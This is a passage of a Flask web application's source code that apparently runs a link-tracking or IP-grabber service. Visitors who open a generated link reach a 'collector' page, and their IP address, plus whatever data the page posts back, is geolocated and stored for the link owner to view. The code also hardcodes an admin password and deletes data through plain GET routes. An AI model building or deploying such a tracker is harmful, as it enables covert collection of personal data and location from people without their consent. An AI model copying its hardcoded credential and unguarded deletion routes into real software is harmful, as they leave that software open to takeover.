    )
    if result.modified_count:
        return redirect(url_for('dashboard'))
    else:
        return 'Link not found or already deleted', 404

@app.route('/c/<link_id>')
def collector_page(link_id):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    try:
        loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=2).json()
        city = loc.get('city', 'Unknown')
        country = loc.get('country', 'Unknown')
    except:
        city = 'Unknown'
        country = 'Unknown'
    return render_template_string(COLLECTOR_HTML, ip=ip, link_id=link_id)

@app.route('/collect/<link_id>', methods=['POST'])
def collect_data(link_id):
    data = request.get_json()
    if not data:
        return 'ERROR: No data', 400
    data['time'] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ip = data.get('ip')
    if ip:
        try:
            loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=2).json()
            data['city'] = loc.get('city', 'Unknown')
            data['country'] = loc.get('country', 'Unknown')
        except:
            data['city'] = 'Unknown'
            data['country'] = 'Unknown'
    else:
        data['city'] = 'Unknown'
        data['country'] = 'Unknown'
    result = users_col.update_one(
        {'links.id': link_id},
        {'$push': {'links.$.visits': data}}
    )
    if result.matched_count:
        return 'OK', 200
    return 'ERROR: Link not found', 404

@app.route('/view_link/<link_id>')
def view_link(link_id):
    if 'user' not in session:
        return redirect(url_for('login'))
    user = get_user(session['user'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    link = None
    for l in user['links']:
        if l['id'] == link_id:
            link = l
            break
    if not link:
        return 'Link not found', 404
    return render_template_string(VIEW_LINK_HTML, link=link)

@app.route('/delete_visit/<link_id>/<int:index>')
def delete_visit(link_id, index):
    if 'user' not in session:
        return redirect(url_for('login'))
    user = get_user(session['user'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    for l in user['links']:
        if l['id'] == link_id:
            if 0 <= index < len(l['visits']):
                l['visits'].pop(index)
                users_col.update_one(
                    {'username': session['user'], 'links.id': link_id},
                    {'$set': {'links.$.visits': l['visits']}}
                )
                break
    return redirect(url_for('view_link', link_id=link_id))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# ===== Admin Routes =====
@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if 'admin' in session:
        return redirect(url_for('admin_panel'))
    error = None
    if request.method == 'POST':
        password = request.form.get('admin_password', '').strip()
        if password == 'arif123':
            session['admin'] = True
            return redirect(url_for('admin_panel'))
        else:
            error = 'Invalid admin password'
    return render_template_string(ADMIN_LOGIN_HTML, error=error)

@app.route('/admin-panel')
def admin_panel():
    if 'admin' not in session:
        return redirect(url_for('admin_login'))
    all_users = list(users_col.find())
    return render_template_string(ADMIN_PANEL_HTML, users=all_users)

@app.route('/admin-view-user/<username>')
def admin_view_user(username):
    if 'admin' not in session:
        return redirect(url_for('admin_login'))
    user = get_user(username)
    if not user:
        return 'User not found', 404
    return render_template_string(ADMIN_USER_HTML, user=user)

# ===== Admin Clear User Data (links + visits, but keep account) =====
@app.route('/admin-clear-user-data/<username>')
def admin_clear_user_data(username):
    if 'admin' not in session:
        return redirect(url_for('admin_login'))
    # Set links array to empty
    result = users_col.update_one(
        {'username': username},
        {'$set': {'links': []}}
    )
    if result.modified_count:
        return redirect(url_for('admin_panel'))
    else:
        return 'User not found or already empty', 404

# ===== Admin Delete User (account + all data) =====
@app.route('/admin-delete-user/<username>')
def admin_delete_user(username):
    if 'admin' not in session:
        return redirect(url_for('admin_login'))
    # Prevent deleting the admin account
    if username == 'admin':
        return "You cannot delete the admin account!", 403
    result = users_col.delete_one({'username': username})
    if result.deleted_count:
        return redirect(url_for('admin_panel'))
    else:
        return 'User not found', 404

@app.route('/admin-logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('dashboard'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)